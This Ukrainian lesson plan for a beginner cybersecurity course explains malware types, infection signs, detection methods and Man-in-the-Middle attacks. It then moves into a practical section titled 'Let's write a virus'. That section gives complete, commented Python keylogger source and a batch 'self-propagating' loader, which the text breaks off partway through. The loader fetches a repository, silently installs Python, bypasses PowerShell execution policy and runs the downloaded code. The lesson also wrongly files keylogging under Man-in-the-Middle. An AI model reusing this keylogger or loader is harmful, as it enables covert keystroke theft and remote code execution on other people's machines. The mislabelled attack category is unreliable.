# Урок 1-2. Кібербезпека: віруси, мережеві загрози та базовий захист

## Формат заняття

- Тривалість: 2 академічні пари
- Тип заняття: комбіноване
- Формат: короткі теоретичні блоки + обговорення + практичні мінікейс-завдання
- Принцип: мінімум сухої теорії, максимум прикладів із реального життя

## Мета заняття

Пояснити студентам, що таке шкідливе програмне забезпечення, чим відрізняються основні типи кіберзагроз, як розпізнавати небезпечні ситуації в мережі та як діяти так, щоб зменшити ризик зараження або втрати даних.

## Очікувані результати

Після заняття студенти:

- розрізняють вірус, черв'як, троян, spyware, ransomware, adware, rootkit, bot;
- пояснюють, чим небезпечна атака `Man-in-the-Middle`;
- розпізнають базові ознаки зараження пристрою;
- називають основні способи виявлення шкідливого ПЗ;
- можуть навести приклади фішингу, соціальної інженерії та витоку даних;
- знають базові правила цифрової гігієни.

## Матеріали до заняття

- презентація або документ із ключовими термінами;
- 3-5 скриншотів або ілюстрацій для розбору;
- короткі кейси для обговорення;
- тестові запитання наприкінці;
- домашнє завдання.

## Візуали, які бажано додати

У цей `md` можна додати картинки під час підготовки презентації або матеріалу для демонстрації. Найкраще підійдуть такі ілюстрації:

- схема "типи шкідливого ПЗ" у вигляді дерева або блок-схеми;
- порівняльна таблиця `вірус / троян / черв'як / ransomware`;
- ілюстрація атаки `Man-in-the-Middle` між користувачем і сайтом;
- приклад фішингового листа з позначеними підозрілими елементами;
- скриншот браузера з `HTTPS` і значком сертифіката;
- інфографіка "ознаки зараження пристрою";
- фінальний слайд "10 правил цифрової безпеки".


## Організаційний початок заняття

### 1. Старт і налаштування на роботу

Викладач вітається, коротко озвучує тему заняття, відмічає присутніх у перші 10-15 хвилин та нагадує про бажану роботу з увімкненими камерами для кращої взаємодії. На старті важливо створити відчуття, що тема стосується кожного: банківські застосунки, соцмережі, паролі, Wi‑Fi, покупки онлайн, листування, смартфон.

Приклад вступу:

> Сьогодні ми говоримо не просто про "віруси", а про реальні цифрові загрози, з якими люди стикаються щодня: підроблені сайти, крадіжку паролів, заражені файли, фішингові листи та перехоплення даних у мережі.

### 2. Актуалізація

На початку заняття доречно поставити 2-3 швидкі відкриті запитання:

- Чи бачили ви коли-небудь підозрілий лист або повідомлення?
- Чи доводилося вам підключатися до відкритого Wi‑Fi у кафе чи торговому центрі?
- Як ви думаєте, чим вірус відрізняється від трояна?

Це одразу включає студентів у діалог і допомагає уникнути формату монологу.

## Структура заняття з таймінгом

### Блок 1. Вступ у тему кібербезпеки

Орієнтовний час: 10-15 хв

Кібербезпека - це захист пристроїв, мереж, облікових записів і даних від несанкціонованого доступу, викрадення, блокування або пошкодження. Це не вузька технічна тема лише для спеціалістів. Вона стосується кожного, хто користується поштою, месенджерами, банківськими застосунками або зберігає файли на комп'ютері чи телефоні.

Тут важливо провести зв'язок із реальним життям. Наприклад, втрата доступу до Telegram, крадіжка пароля від Gmail, фішинг у Instagram або зараження комп'ютера через файл "рахунок.pdf.exe" - це вже не абстракція, а повсякденні ризики.


### Блок 2. Що таке вірус і що таке malware

Орієнтовний час: 15 хв

Словом "вірус" часто називають будь-яку загрозу, але технічно це не зовсім правильно. Вірус - це лише один із типів шкідливого ПЗ. Загальна назва для всіх таких загроз - `malware`.

Вірус зазвичай вбудовується в інший файл або програму та активується разом із ними. Його мета може бути різною: псувати файли, поширюватися, заважати роботі системи або готувати ґрунт для інших атак.

Корисно пояснити студентам просту ідею: не все шкідливе ПЗ поводиться однаково. Одні загрози створені для зараження, інші - для маскування, ще інші - для крадіжки даних або вимагання грошей.

### Блок 3. Основні типи шкідливого ПЗ

Орієнтовний час: 25-30 хв

#### Вірус

Приєднується до файлів або програм і активується під час їх запуску. Часто змінює або пошкоджує дані.

#### Черв'як

Поширюється мережею самостійно. Йому не обов'язково чекати, поки користувач відкриє заражений файл. Саме тому черв'яки особливо небезпечні у великих мережах.

#### Троян

Маскується під корисний файл, застосунок, інсталятор або "оновлення". Користувач запускає його сам, думаючи, що це безпечний файл.

#### Spyware

Непомітно збирає інформацію про користувача. До цієї категорії належить і кейлогер - інструмент, що фіксує натискання клавіш.

#### Ransomware

Блокує або шифрує дані та вимагає викуп за відновлення доступу.

#### Adware

Показує нав'язливу рекламу, підміняє сторінки, відкриває вікна, перенаправляє на підозрілі сайти.

#### Rootkit

Приховує присутність шкідливого ПЗ у системі, щоб користувач або антивірус якомога довше не виявили зараження.

#### Bot

Робить пристрій частиною керованої мережі заражених машин. Такі пристрої використовують для спаму, масових атак або прихованих дій.

Після пояснення корисно поставити коротке питання в аудиторію:

> Як ви думаєте, що небезпечніше для звичайного користувача: троян чи ransomware? Чому?


### Блок 4. Як відрізняються ці загрози

Орієнтовний час: 10-12 хв

Різниця між типами шкідливого ПЗ найкраще пояснюється через три критерії:

- як воно потрапляє у систему;
- як воно поширюється;
- яку мету переслідує.

Вірус прив'язується до файла. Черв'як поширюється мережею. Троян ховається під виглядом корисного застосунку. Spyware краде інформацію. Ransomware блокує доступ до файлів. Rootkit приховує сам факт зараження.

Це хороший момент для короткої мініактивності. Можна називати сценарії, а студенти мають визначити тип загрози:

- "Програма маскується під гру, а потім краде паролі" - троян.
- "Файли зашифровані, на екрані вимога переказати гроші" - ransomware.
- "Підозріла активність поширюється мережею без участі користувача" - черв'як.

### Блок 5. Як зрозуміти, що пристрій може бути заражений

Орієнтовний час: 15 хв

Ознаки зараження не завжди виглядають драматично. Часто все починається з дрібниць:

- комп'ютер або телефон раптово працює повільніше;
- браузер відкриває незнайомі сторінки;
- з'являється багато реклами;
- програми зависають або закриваються;
- антивірус вимикається сам;
- зникає місце на диску;
- акаунти починають поводитися підозріло;
- файли змінюють розширення або не відкриваються.

Тут доречно пояснити, що одна ознака ще не означає зараження. Але кілька симптомів разом - привід запустити перевірку системи та уважно подивитися на нещодавно встановлені програми, файли та розширення.


### Блок 6. Як виявляють шкідливе ПЗ

Орієнтовний час: 15-20 хв

Антивіруси та системи захисту не "вгадують", а працюють за певними методами.

#### Сигнатурний аналіз

Пошук уже відомих фрагментів шкідливого коду.

#### Евристичний аналіз

Пошук підозрілих ознак навіть у нових або змінених зразках.

#### Поведінковий аналіз

Оцінка того, що саме робить програма: шифрує файли, підключається до підозрілих серверів, намагається зібрати дані, змінює налаштування системи.

#### Мережевий аналіз

Виявлення нетипового трафіку, спроб передавання даних або підключення до підозрілих адрес.

#### Пісочниця

Запуск підозрілої програми в ізольованому середовищі, щоб подивитися на її поведінку без ризику для основної системи.

Після цього блоку можна поставити запитання:

> Чому, на вашу думку, одного лише антивіруса недостатньо для повної безпеки?

### Блок 7. Чому люди створюють віруси та інші загрози

Орієнтовний час: 10-12 хв

Мотиви зловмисників важливо пояснювати без романтизації.

Основні причини:

- гроші;
- крадіжка даних;
- шпигунство;
- саботаж;
- самоствердження або бажання "перевірити себе";
- ідеологічні або політичні мотиви.

Важливо підкреслити, що сьогодні шкідливе ПЗ - це часто не "робота одиночки заради жарту", а частина організованої злочинної діяльності.

### Блок 8. Мережева загроза Man-in-the-Middle

Орієнтовний час: 20 хв

`Man-in-the-Middle` - це атака, під час якої зловмисник опиняється між двома сторонами обміну даними. Жертва може навіть не здогадуватися, що її трафік читають або змінюють.

Просте пояснення для студентів:

> Уявіть, що ви передаєте записку другові, але між вами стоїть третя людина, яка спочатку читає її, а потім передає далі. Інколи вона ще й змінює зміст. У цифровому середовищі це і є ідея Man-in-the-Middle.

Наслідки:

- крадіжка логінів і паролів;
- перехоплення повідомлень;
- підміна даних;
- перенаправлення на фальшиві сторінки;
- компрометація платежів або сесій.

Захист:

- уважно перевіряти `HTTPS`;
- не користуватися сумнівними відкритими Wi‑Fi;
- використовувати `VPN` у ненадійних мережах;
- не вводити паролі на підозрілих сторінках;
- увімкнути двофакторну автентифікацію.

### Блок 9. Інші поширені кіберзагрози

Орієнтовний час: 20 хв

#### Фішинг

Підроблені листи, повідомлення та сайти, які змушують користувача добровільно віддати свої дані.

#### Соціальна інженерія

Маніпуляція людиною через страх, поспіх, довіру або цікавість.

#### Підбір або повторне використання паролів

Небезпека слабких та однакових паролів на різних сервісах.

#### Витоки даних

Втрата або розголошення інформації через злам, помилку, зараження або необережність.

#### DDoS

Перевантаження сервісу великою кількістю запитів, через що він стає недоступним.


### Блок 10. Практична частина

## НАПИШЕМО ВІРУС
Звертаю вашу увагу що це безпечний вірус, який працює лише за активної згоди користувача.
Тип вірусу KeyLogger, що є частиною man-in-the-middle проблеми

Повний код нижче, тут пояснення.

Добре. Я дам шматок коду, нижче одразу звичайний опис текстом. Потім наступний шматок коду і знов опис. Без списків.

```
keys_used: list | None = []
flag: bool = False
keys: str = ""
now: _dt = _dt.now()
```

Тут створюються глобальні змінні, які будуть спільними для всіх функцій.
`keys_used` збере всі події клавіш.
`flag` показує, чи зараз клавіша вважається натиснутою.
`keys` накопичує усі натискання у вигляді одного рядка.
`now` просто фіксує момент запуску, хоча у цьому коді ця змінна не використовується.

```
def generate_text_log(key: _Any) -> None:
    with open("./out/key_log.txt", "w+") as KEYS:
        KEYS.write(key)
```

Ця функція бере рядок та повністю перезаписує файл `key_log.txt`.
Вміст файлу завжди замінюється на поточну накопичену строку натискань.

```
def generate_json_file(used_keys: _Any) -> None:
    with open("./out/key_log.json", "+wb") as key_log:
        key_list_bytes = _dumps(used_keys).encode()
        key_log.write(key_list_bytes)
```

Функція створює або перезаписує JSON файл, у якому зберігається список подій типу Pressed, Held, Released.
Вона бере Python список, перетворює його в JSON-рядок, а потім у байти і записує у файл.

```
def on_press(key: _Any) -> None:
    global flag, keys_used, keys
    if not flag:
        keys_used.append({"Pressed": f"{key}"})
        flag = True

    if flag:
        keys_used.append({"Held": f"{key}"})
    generate_json_file(keys_used)
```

Це callback, який викликається бібліотекою pynput при кожному натисканні клавіші.
Коли клавішу тільки-но натиснули і `flag` був False, подія записується як Pressed і прапорець стає True.
Поки клавішу утримують, кожне повторне спрацьовування on_press додає Held.
Після кожної події JSON файл оновлюється.

```
def on_release(key: _Any) -> None:
    global flag, keys_used, keys
    keys_used.append({"Released": f"{key}"})

    if flag:
        flag = False
    generate_json_file(keys_used)

    keys = keys + str(key)
    generate_text_log(str(keys))
```

Це callback, який викликається, коли клавішу відпускають.
У список записується подія Released.
Прапорець знову повертається в False, бо клавіша перестала бути натиснутою.
У текстовий лог додається символ, який утворює загальну строку з усіх натискань.

```
_LISTENER = _keyboard.Listener(on_press=on_press, on_release=on_release)
```

Створюється глобальний об’єкт слухача pynput, який буде перехоплювати клавіатурні події у системі.

```
def start_keylogger():
    listener = _LISTENER
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state="disabled")
    stop_button.config(state="normal")
```

Функція запускає перехоплювач клавіш у фоні.
Кнопка Start блокується, Stop стає доступною, а текст у вікні змінюється.

```
def stop_keylogger():
    listener = _LISTENER
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state="normal")
    stop_button.config(state="disabled")
```

Ця функція зупиняє listener, повертає кнопки у початковий стан і оновлює текст у вікні.

```
root = _Tk()
root.title("Keylogger")

label = _Label(root, text='Click "Start" to begin key logging...')
label.config(anchor=_CENTER)
label.pack()

start_button = _Button(root, text="Start", command=start_keylogger)
start_button.pack(side=_LEFT)

stop_button = _Button(root, text="Stop", command=stop_keylogger, state="disabled")
stop_button.pack(side=_RIGHT)

root.geometry("250x250")
root.mainloop()
```

Це створює графічний інтерфейс Tkinter.
Вікно має напис, кнопку Start і кнопку Stop.
Start запускає перехоплення клавіш, Stop зупиняє.
Вікно запускається у подієвий цикл і програма працює доти, доки його не закриють.


встановіть бібліотеки:

```pip
pip install pynput
```


### Повний код

```python
from tkinter import CENTER as _CENTER  # Імпортує константу CENTER для вирівнювання елементів інтерфейсу по центру.
from tkinter import RIGHT as _RIGHT  # Імпортує константу RIGHT для вирівнювання елементів інтерфейсу праворуч.
from tkinter import LEFT as _LEFT  # Імпортує константу LEFT для вирівнювання елементів інтерфейсу ліворуч.
from tkinter import Tk as _Tk  # Імпортує головне вікно Tkinter, на основі якого створюється GUI програми.
from tkinter import Button as _Button  # Імпортує кнопку Tkinter для створення елементів керування у вікні.
from tkinter import Label as _Label  # Імпортує текстову мітку Tkinter для відображення написів у вікні.
from pynput import keyboard as _keyboard  # Імпортує модуль keyboard з pynput для обробки натискань клавіш.
from typing import Any as _Any  # Імпортує тип Any для позначення значень будь-якого типу в підказках типізації.
from datetime import datetime as _dt  # Імпортує datetime для отримання поточної дати та часу.

from json import dumps as _dumps  # Імпортує функцію dumps для перетворення Python-даних у JSON-рядок.

keys_used: list | None = []  # Зберігає список використаних або натиснутих клавіш, спочатку створюється порожній список.
flag: bool = False  # Зберігає логічний стан програми, наприклад чи активний запис або певний режим роботи.
keys: str = ""  # Зберігає натиснуті клавіші у вигляді одного текстового рядка.
now: _dt = _dt.now()  # Зберігає поточну дату та час запуску або створення цього значення.


def generate_text_log(key: _Any) -> None:  # Оголошує функцію, яка створює текстовий лог і нічого не повертає.
    """  # Початок документаційного коментаря функції.
    Generates a text log file containing the recorded keystrokes.  # Описує, що функція створює текстовий файл із записаними натисканнями клавіш.

    Args:  # Початок опису параметрів функції.
        key (Any): The keystroke data to write into the log file.  # Параметр key містить дані, які потрібно записати у текстовий файл.
    """  # Кінець документаційного коментаря функції.

    with open("./out/key_log.txt", "w+") as KEYS:  # Відкриває або створює файл key_log.txt у папці out для запису текстових даних.
        KEYS.write(key)  # Записує передане значення key у відкритий текстовий файл.


def generate_json_file(used_keys: _Any) -> None:  # Оголошує функцію, яка створює JSON лог і нічого не повертає.
    """  # Початок документаційного коментаря функції.
    Generates a JSON log file with keystroke events.  # Описує, що функція створює JSON файл із подіями натискання клавіш.

    Args:  # Початок опису параметрів функції.
        used_keys (Any): A list of key events to log in JSON format.  # Параметр used_keys містить список подій, які треба зберегти у JSON форматі.
    """  # Кінець документаційного коментаря функції.

    with open("./out/key_log.json", "+wb") as key_log:  # Відкриває або створює файл key_log.json у бінарному режимі для запису.
        key_list_bytes = _dumps(used_keys).encode()  # Перетворює used_keys у JSON рядок, а потім кодує його у байти.
        key_log.write(key_list_bytes)  # Записує підготовлені байти у JSON файл.

def on_press(key: _Any) -> None:  # Оголошує функцію, яка викликається під час натискання клавіші.
    """  # Початок документаційного коментаря функції.
    Handles key press events, logging the pressed or held keys.  # Описує, що функція обробляє натискання клавіш і записує їх стан.

    Args:  # Початок опису параметрів функції.
        key (Any): The key that was pressed.  # Параметр key містить клавішу, яка була натиснута.
    """  # Кінець документаційного коментаря функції.

    global flag, keys_used, keys  # Дозволяє змінювати глобальні змінні flag, keys_used і keys всередині функції.
    if not flag:  # Перевіряє, чи клавіша ще не вважається утримуваною.
        keys_used.append({"Pressed": f"{key}"})  # Додає до списку запис про початкове натискання клавіші.
        flag = True  # Встановлює прапорець, що клавіша зараз перебуває у стані натискання.

    if flag:  # Перевіряє, чи активний стан натискання клавіші.
        keys_used.append({"Held": f"{key}"})  # Додає до списку запис про утримання клавіші.
    generate_json_file(keys_used)  # Оновлює JSON файл із поточним списком подій клавіатури.


def on_release(key: _Any) -> None:  # Оголошує функцію, яка викликається під час відпускання клавіші.
    """  # Початок документаційного коментаря функції.
    Handles key release events and updates log files.  # Описує, що функція обробляє відпускання клавіш і оновлює файли логів.

    Args:  # Початок опису параметрів функції.
        key (Any): The key that was released.  # Параметр key містить клавішу, яка була відпущена.
    """  # Кінець документаційного коментаря функції.

    global flag, keys_used, keys  # Дозволяє змінювати глобальні змінні flag, keys_used і keys всередині функції.
    keys_used.append({"Released": f"{key}"})  # Додає до списку запис про відпускання клавіші.

    if flag:  # Перевіряє, чи був активний стан натискання клавіші.
        flag = False  # Скидає прапорець, бо клавішу вже відпущено.
    generate_json_file(keys_used)  # Оновлює JSON файл після додавання події відпускання клавіші.

    keys = keys + str(key)  # Додає відпущену клавішу до загального текстового рядка натискань.
    generate_text_log(str(keys))  # Оновлює текстовий файл із накопиченим рядком клавіш.

_LISTENER = _keyboard.Listener(on_press=on_press, on_release=on_release)  # Створює слухач клавіатури, який викликає on_press при натисканні клавіші та on_release при її відпусканні.


def start_keylogger():  # Оголошує функцію, яка запускає прослуховування клавіатури.
    """  # Початок документаційного коментаря функції.
    Initiates the keylogger, enabling keystroke logging.  # Описує, що функція запускає запис натискань клавіш.
    """  # Кінець документаційного коментаря функції.

    listener = _LISTENER  # Створює локальне посилання на заздалегідь підготовлений об'єкт слухача клавіатури.
    listener.start()  # Запускає слухач клавіатури, щоб він почав обробляти події натискання та відпускання клавіш.
    label.config(  # Змінює текст у мітці інтерфейсу, щоб показати поточний стан програми.
        text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'"  # Виводить повідомлення, що запис клавіш запущено і дані зберігаються у файл.
    )  # Завершує виклик налаштування тексту мітки.
    start_button.config(state="disabled")  # Вимикає кнопку Start, щоб користувач не запустив слухач повторно.
    stop_button.config(state="normal")  # Вмикає кнопку Stop, щоб користувач міг зупинити запис клавіш.


def stop_keylogger():  # Оголошує функцію, яка зупиняє прослуховування клавіатури.
    """  # Початок документаційного коментаря функції.
    Stops the keylogger, halting keystroke logging.  # Описує, що функція зупиняє запис натискань клавіш.
    """  # Кінець документаційного коментаря функції.

    listener = _LISTENER  # Створює локальне посилання на той самий об'єкт слухача клавіатури.
    listener.stop()  # Зупиняє слухач клавіатури, щоб він більше не обробляв натискання клавіш.
    label.config(text="Keylogger stopped.")  # Оновлює текст мітки і показує, що запис клавіш зупинено.
    start_button.config(state="normal")  # Знову вмикає кнопку Start, щоб запис можна було запустити повторно.
    stop_button.config(state="disabled")  # Вимикає кнопку Stop, бо після зупинки її дія вже не потрібна.


if __name__ == "__main__":  # Перевіряє, чи файл запущено напряму, а не імпортовано як модуль.
    root = _Tk()  # Створює головне вікно програми Tkinter.
    root.title("Keylogger")  # Встановлює заголовок головного вікна програми.

    label = _Label(root, text='Click "Start" to begin key logging...')  # Створює текстову мітку з початковою інструкцією для користувача.
    label.config(anchor=_CENTER)  # Налаштовує вирівнювання тексту мітки по центру.
    label.pack()  # Додає мітку у вікно та дозволяє Tkinter автоматично розмістити її.

    start_button = _Button(root, text="Start", command=start_keylogger)  # Створює кнопку Start, яка запускає функцію start_keylogger.
    start_button.pack(side=_LEFT)  # Додає кнопку Start у вікно і розміщує її зліва.

    stop_button = _Button(root, text="Stop", command=stop_keylogger, state="disabled")  # Створює кнопку Stop, яка спочатку вимкнена і викликає stop_keylogger.
    stop_button.pack(side=_RIGHT)  # Додає кнопку Stop у вікно і розміщує її справа.

    root.geometry("250x250")  # Встановлює розмір головного вікна 250 на 250 пікселів.

    root.mainloop()  # Запускає головний цикл Tkinter, щоб вікно реагувало на дії користувача.
```


### Авторозмноження

Це bat файл який розмножує та завантажує з серверу вірус, він також є безпечним та законним, повний код після пояснень


### 1. Налаштування

```bat
set "REPO_URL=https://github.com/OWNER/REPO.git"
set "BRANCH=main"
set "PROJECT_DIR=%~dp0project"
set "ENTRYPOINT=main.py"
set "VENV_DIR=.venv"
set "LOG_FILE=%~dp0setup_log.txt"
```

Тут вказується GitHub репозиторій, гілка, папка проєкту, файл запуску, назва venv і файл логів.

### 2. Python для Windows 8

```bat
set "PYTHON_VERSION=3.8.10"
set "PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-amd64.exe"
set "PYTHON_INSTALLER=%TEMP%\python-%PYTHON_VERSION%-amd64.exe"
set "PYTHON_EXE=%LocalAppData%\Programs\Python\Python38\python.exe"
```

Якщо Python не знайдено, скрипт скачає Python 3.8.10. Це більш сумісний варіант для Windows 8, ніж Python 3.13.

### 3. Скачування проєкту

Якщо встановлений Git, скрипт клонує або оновлює репозиторій. Якщо Git немає, він скачує ZIP з GitHub і розпаковує його через вбудований Windows Shell, без `Expand-Archive`.

### 4. Створення venv і запуск

Скрипт створює `.venv`, активує її, оновлює pip, ставить залежності з `requirements.txt` або `pyproject.toml`, після чого запускає `main.py`.

Повний код:

коментра тут це REM something (REM у бат файлі = # в пайтоні)

```bat
@echo off  REM Вимикає виведення команд у консоль, щоб користувач бачив тільки потрібні повідомлення.
setlocal EnableExtensions EnableDelayedExpansion  REM Вмикає розширені можливості batch і відкладене розкриття змінних через !VAR!.

REM =========================  REM Візуальний розділювач секції.
REM CONFIG  REM Початок секції налаштувань скрипта.
REM =========================  REM Візуальний розділювач секції.
set "REPO_URL=https://github.com/OWNER/REPO.git"  REM Задає адресу GitHub репозиторію, який треба завантажити.
set "BRANCH=main"  REM Задає назву гілки репозиторію, яку треба використовувати.
set "PROJECT_DIR=%~dp0project"  REM Задає папку project поруч із цим bat файлом як місце для проєкту.
set "ENTRYPOINT=main.py"  REM Задає головний Python файл, який буде запускатися після налаштування.
set "VENV_DIR=.venv"  REM Задає назву папки для віртуального середовища Python.
set "LOG_FILE=%~dp0setup_log.txt"  REM Задає файл логів поруч із цим bat файлом.

set "PYTHON_VERSION=3.8.10"  REM Задає версію Python, яку треба встановити, якщо Python не знайдено.
set "PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-amd64.exe"  REM Формує посилання для завантаження інсталятора Python.
set "PYTHON_INSTALLER=%TEMP%\python-%PYTHON_VERSION%-amd64.exe"  REM Задає шлях, куди буде збережено інсталятор Python у тимчасовій папці.
set "PYTHON_EXE=%LocalAppData%\Programs\Python\Python38\python.exe"  REM Задає очікуваний шлях до встановленого Python 3.8 для поточного користувача.

set "PS=powershell -NoProfile -ExecutionPolicy Bypass -Command"  REM Зберігає команду PowerShell для подальшого завантаження файлів і розпакування ZIP.

call :log "=============================="  REM Записує розділювач у лог і консоль.
call :log "Setup started: %DATE% %TIME%"  REM Записує дату і час запуску скрипта.
call :log "REPO_URL=%REPO_URL%"  REM Записує в лог адресу репозиторію.
call :log "BRANCH=%BRANCH%"  REM Записує в лог вибрану гілку.
call :log "PROJECT_DIR=%PROJECT_DIR%"  REM Записує в лог шлях до папки проєкту.
call :log "ENTRYPOINT=%ENTRYPOINT%"  REM Записує в лог назву головного Python файлу.
call :log "=============================="  REM Записує розділювач у лог і консоль.

REM =========================  REM Візуальний розділювач секції.
REM DOWNLOAD PROJECT  REM Початок секції завантаження проєкту.
REM =========================  REM Візуальний розділювач секції.
call :log "Step: download project"  REM Записує в лог, що почався етап завантаження проєкту.

set "HAS_GIT=0"  REM За замовчуванням вважає, що Git не знайдено.
where git >nul 2>nul && set "HAS_GIT=1"  REM Перевіряє наявність Git у системі і ставить HAS_GIT=1, якщо Git знайдено.

if "%HAS_GIT%"=="1" (  REM Якщо Git знайдено, проєкт буде завантажено або оновлено через Git.
  call :log "Git found"  REM Записує в лог, що Git знайдено.
  if exist "%PROJECT_DIR%\.git" (  REM Перевіряє, чи папка проєкту вже є Git репозиторієм.
    call :log "Repository already exists, updating"  REM Записує в лог, що існуючий репозиторій буде оновлено.
    pushd "%PROJECT_DIR%" || call :fail "Cannot enter project directory"  REM Переходить у папку проєкту або завершує скрипт з помилкою.
    git fetch --all >> "%LOG_FILE%" 2>&1 || call :fail "git fetch failed"  REM Завантажує інформацію про всі віддалені зміни або завершує скрипт з помилкою.
    git checkout "%BRANCH%" >> "%LOG_FILE%" 2>&1 || call :fail "git checkout failed"  REM Перемикається на потрібну гілку або завершує скрипт з помилкою.
    git pull >> "%LOG_FILE%" 2>&1 || call :fail "git pull failed"  REM Оновлює локальний код із віддаленого репозиторію або завершує скрипт з помилкою.
    popd  REM Повертається до попередньої папки.
  ) else (  REM Якщо Git репозиторію ще немає, буде виконано клонування.
    call :log "Cloning repository"  REM Записує в лог, що починається клонування репозиторію.
    if exist "%PROJECT_DIR%" rmdir /s /q "%PROJECT_DIR%" >nul 2>nul  REM Видаляє стару папку проєкту, якщо вона існує, щоб клонувати чисту копію.
    git clone --branch "%BRANCH%" "%REPO_URL%" "%PROJECT_DIR%" >> "%LOG_FILE%" 2>&1 || call :fail "git clone failed"  REM Клонує потрібну гілку репозиторію або завершує скрипт з помилкою.
  )  REM Завершує блок роботи з існуючим або новим Git репозиторієм.
) else (  REM Якщо Git не знайдено, проєкт буде завантажено як ZIP архів.
  call :log "Git not found, downloading ZIP"  REM Записує в лог, що Git відсутній і буде використано ZIP.

  set "REPO_WEB=%REPO_URL%"  REM Копіює URL репозиторію в окрему змінну для підготовки веб посилання.
  if /i "!REPO_WEB:~-4!"==".git" set "REPO_WEB=!REPO_WEB:~0,-4!"  REM Якщо URL закінчується на .git, прибирає це закінчення.
  set "ZIP_URL=!REPO_WEB!/archive/refs/heads/%BRANCH%.zip"  REM Формує посилання на ZIP архів потрібної гілки GitHub.

  set "TMP_DIR=%TEMP%\repo_%RANDOM%%RANDOM%"  REM Створює унікальний шлях до тимчасової папки.
  set "ZIP_FILE=!TMP_DIR!\repo.zip"  REM Задає шлях до тимчасового ZIP файлу.
  set "UNZIP_DIR=!TMP_DIR!\unzipped"  REM Задає шлях до папки, куди буде розпаковано ZIP.

  mkdir "!TMP_DIR!" >nul 2>nul || call :fail "Cannot create temp directory"  REM Створює тимчасову папку або завершує скрипт з помилкою.
  mkdir "!UNZIP_DIR!" >nul 2>nul || call :fail "Cannot create unzip directory"  REM Створює папку для розпакування або завершує скрипт з помилкою.

  call :log "ZIP_URL=!ZIP_URL!"  REM Записує в лог сформоване посилання на ZIP архів.

  %PS% "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('!ZIP_URL!', '!ZIP_FILE!')" >> "%LOG_FILE%" 2>&1  REM Через PowerShell завантажує ZIP архів репозиторію.
  if errorlevel 1 call :fail "ZIP download failed"  REM Якщо завантаження завершилось з помилкою, викликає обробник помилки.

  %PS% "$shell = New-Object -ComObject Shell.Application; $zip = $shell.NameSpace('!ZIP_FILE!'); $dst = $shell.NameSpace('!UNZIP_DIR!'); if ($zip -eq $null) { exit 1 }; $dst.CopyHere($zip.Items(), 16); Start-Sleep -Seconds 5" >> "%LOG_FILE%" 2>&1  REM Через PowerShell і Shell.Application розпаковує ZIP архів у тимчасову папку.
  if errorlevel 1 call :fail "ZIP unzip failed"  REM Якщо розпакування завершилось з помилкою, викликає обробник помилки.

  set "EXTRACTED="  REM Очищає змінну, у яку буде записано шлях до розпакованої папки.
  for /d %%D in ("!UNZIP_DIR!\*") do (  REM Перебирає папки всередині розпакованого архіву.
    set "EXTRACTED=%%~fD"  REM Зберігає повний шлях до знайденої розпакованої папки.
    goto got_extracted  REM Переходить до мітки після знаходження першої папки.
  )  REM Завершує цикл пошуку розпакованої папки.

  :got_extracted  REM Мітка, куди переходить скрипт після знаходження розпакованої папки.
  if not defined EXTRACTED call :fail "Extracted folder not found"  REM Якщо папку не знайдено, завершує скрипт з помилкою.

  if exist "%PROJECT_DIR%" rmdir /s /q "%PROJECT_DIR%" >nul 2>nul  REM Видаляє стару папку проєкту, якщо вона існує.
  xcopy "!EXTRACTED!" "%PROJECT_DIR%\" /E /I /Y >> "%LOG_FILE%" 2>&1 || call :fail "Copy extracted project failed"  REM Копіює розпакований проєкт у робочу папку або завершує скрипт з помилкою.
)  REM Завершує блок завантаження проєкту без Git.

REM =========================  REM Візуальний розділювач секції.
REM FIND OR INSTALL PYTHON  REM Початок секції пошуку або встановлення Python.
REM =========================  REM Візуальний розділювач секції.
call :log "Step: find Python"  REM Записує в лог, що почався пошук Python.

set "PY_CMD="  REM Очищає змінну команди Python.

if exist "%PYTHON_EXE%" set "PY_CMD=%PYTHON_EXE%"  REM Якщо Python є за очікуваним шляхом, використовує цей виконуваний файл.
if not defined PY_CMD py -3.8 -V >nul 2>nul && set "PY_CMD=py -3.8"  REM Якщо Python ще не знайдено, пробує знайти Python 3.8 через Python Launcher.
if not defined PY_CMD py -3 -V >nul 2>nul && set "PY_CMD=py -3"  REM Якщо Python 3.8 не знайдено, пробує знайти будь-який Python 3 через Python Launcher.
if not defined PY_CMD python -V >nul 2>nul && set "PY_CMD=python"  REM Якщо Python Launcher не спрацював, пробує команду python.

if not defined PY_CMD (  REM Якщо Python не знайдено жодним способом, починається встановлення.
  call :log "Python not found, downloading Python %PYTHON_VERSION%"  REM Записує в лог, що Python не знайдено і буде завантажено потрібну версію.

  %PS% "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%PYTHON_URL%', '%PYTHON_INSTALLER%')" >> "%LOG_FILE%" 2>&1  REM Через PowerShell завантажує інсталятор Python.
  if errorlevel 1 call :fail "Python download failed"  REM Якщо завантаження Python завершилось з помилкою, викликає обробник помилки.

  call :log "Installing Python"  REM Записує в лог, що починається встановлення Python.
  "%PYTHON_INSTALLER%" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1 Include_launcher=1 >> "%LOG_FILE%" 2>&1  REM Тихо встановлює Python для поточного користувача з pip і Python Launcher.
  if errorlevel 1 call :fail "Python install failed"  REM Якщо встановлення Python завершилось з помилкою, викликає обробник помилки.

  if exist "%PYTHON_EXE%" set "PY_CMD=%PYTHON_EXE%"  REM Після встановлення перевіряє стандартний шлях до Python і використовує його, якщо файл існує.
  if not defined PY_CMD py -3.8 -V >nul 2>nul && set "PY_CMD=py -3.8"  REM Якщо шлях не спрацював, пробує знайти Python 3.8 через Python Launcher.
  if not defined PY_CMD python -V >nul 2>nul && set "PY_CMD=python"  REM Якщо Python Launcher не спрацював, пробує команду python.

  if not defined PY_CMD call :fail "Python installed, but not found in this session"  REM Якщо Python встановлено, але команда не знайдена, завершує скрипт з помилкою.
)  REM Завершує блок встановлення Python.

call :log "Python command: %PY_CMD%"  REM Записує в лог команду Python, яка буде використовуватися далі.

REM =========================  REM Візуальний розділювач секції.
